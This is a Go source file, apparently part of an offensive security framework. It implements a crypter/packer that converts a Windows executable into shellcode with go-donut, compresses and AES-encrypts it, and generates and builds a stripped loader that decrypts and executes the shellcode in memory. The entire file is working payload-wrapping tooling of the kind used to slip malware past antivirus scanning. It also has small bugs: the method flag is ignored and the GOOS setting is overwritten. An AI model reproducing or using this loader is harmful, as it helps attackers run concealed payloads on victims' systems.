package main

import (
	"bytes"
	"compress/flate"
	"debug/pe"
	"flag"
	"fmt"
	"html/template"
	"io/ioutil"
	"os"
	"os/exec"

	"project/external/go-donut/donut"

	"project/internal/convert"
	"project/internal/crypto/aes"
	"project/internal/module/shellcode"
	"project/internal/random"
	"project/internal/system"
)

func main() {
	var (
		input  string
		output string
		method string
	)
	usage := "input executable file path"
	flag.StringVar(&input, "i", "", usage)
	usage = "output executable file path"
	flag.StringVar(&output, "o", "output.exe", usage)
	usage = "shellcode execute method"
	flag.StringVar(&method, "m", shellcode.MethodVirtualProtect, usage)
	flag.Parse()

	// load executable file
	if input == "" {
		fmt.Println("no input file path")
		return
	}
	exeData, err := ioutil.ReadFile(input) // #nosec
	system.CheckError(err)
	donutCfg := donut.DefaultConfig()

	// read architecture
	peFile, err := pe.NewFile(bytes.NewReader(exeData))
	system.CheckError(err)
	var arch string
	switch peFile.Machine {
	case pe.IMAGE_FILE_MACHINE_I386:
		arch = "386"
		donutCfg.Arch = donut.X32
	case pe.IMAGE_FILE_MACHINE_AMD64:
		arch = "amd64"
		donutCfg.Arch = donut.X64
	default:
		fmt.Printf("unsupported executable file: 0x%02X\n", peFile.Machine)
		return
	}
	fmt.Println("the architecture of the executable file is", arch)

	// convert to shellcode
	fmt.Println("convert executable file to shellcode")
	donutCfg.Entropy = donut.EntropyNone
	scBuf, err := donut.ShellcodeFromBytes(bytes.NewBuffer(exeData), donutCfg)
	system.CheckError(err)

	// compress shellcode
	fmt.Println("compress generated shellcode")
	flateBuf := bytes.NewBuffer(make([]byte, 0, scBuf.Len()/2))
	writer, err := flate.NewWriter(flateBuf, flate.BestCompression)
	system.CheckError(err)
	_, err = scBuf.WriteTo(writer)
	system.CheckError(err)
	err = writer.Close()
	system.CheckError(err)

	// encrypt shellcode
	fmt.Println("encrypt compressed shellcode")
	aesKey := random.Bytes(aes.Key256Bit)
	aesIV := random.Bytes(aes.IVSize)
	encShellcode, err := aes.CBCEncrypt(flateBuf.Bytes(), aesKey, aesIV)
	system.CheckError(err)

	// generate source code
	fmt.Println("generate source code")
	tpl := template.New("execute")
	_, err = tpl.Parse(srcTemplate)
	system.CheckError(err)
	srcFile, err := os.Create("temp.go")
	system.CheckError(err)
	defer func() {
		_ = srcFile.Close()
		_ = os.Remove("temp.go")
	}()
	cfg := config{
		Shellcode: convert.OutputBytes(encShellcode),
		AESKey:    convert.OutputBytes(aesKey),
		AESIV:     convert.OutputBytes(aesIV),
		Method:    "vp",
	}
	err = tpl.Execute(srcFile, cfg)
	system.CheckError(err)

	// build source code
	fmt.Println("build source code to final executable file")
	args := []string{"build", "-v", "-i", "-ldflags", "-s -w", "-o", output, "temp.go"}
	cmd := exec.Command("go", args...) // #nosec
	cmd.Env = append(os.Environ(), "GOOS=windows")
	cmd.Env = append(os.Environ(), "GOARCH="+arch)
	cmdOutput, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(string(cmdOutput))
		fmt.Println(err)
		return
	}
	fmt.Println("build finish")
}

type config struct {
	Shellcode string
	AESKey    string
	AESIV     string
	Method    string
}

const srcTemplate = `
package main

import (
	"bytes"
	"compress/flate"
	"fmt"

	"project/internal/crypto/aes"
	"project/internal/module/shellcode"
)

func main() {
	encShellcode := {{.Shellcode}}

	// decrypt shellcode
	aesKey := {{.AESKey}}
	aesIV := {{.AESIV}}
	decShellcode, err := aes.CBCDecrypt(encShellcode, aesKey, aesIV)
	if err != nil {
		fmt.Println("failed to decrypt shellcode:", err)
		return
	}

	// decompress shellcode
	rc := flate.NewReader(bytes.NewReader(decShellcode))
	sc := bytes.NewBuffer(make([]byte, 0, len(decShellcode)*2))
	_, err = sc.ReadFrom(rc)
	if err != nil {
		fmt.Println("failed to decompress shellcode:", err)
		return
	}

	// execute shellcode
	method := "{{.Method}}"
	err = shellcode.Execute(method, sc.Bytes())
	if err != nil {
		fmt.Println("failed to execute shellcode:", err)
	}
}
`
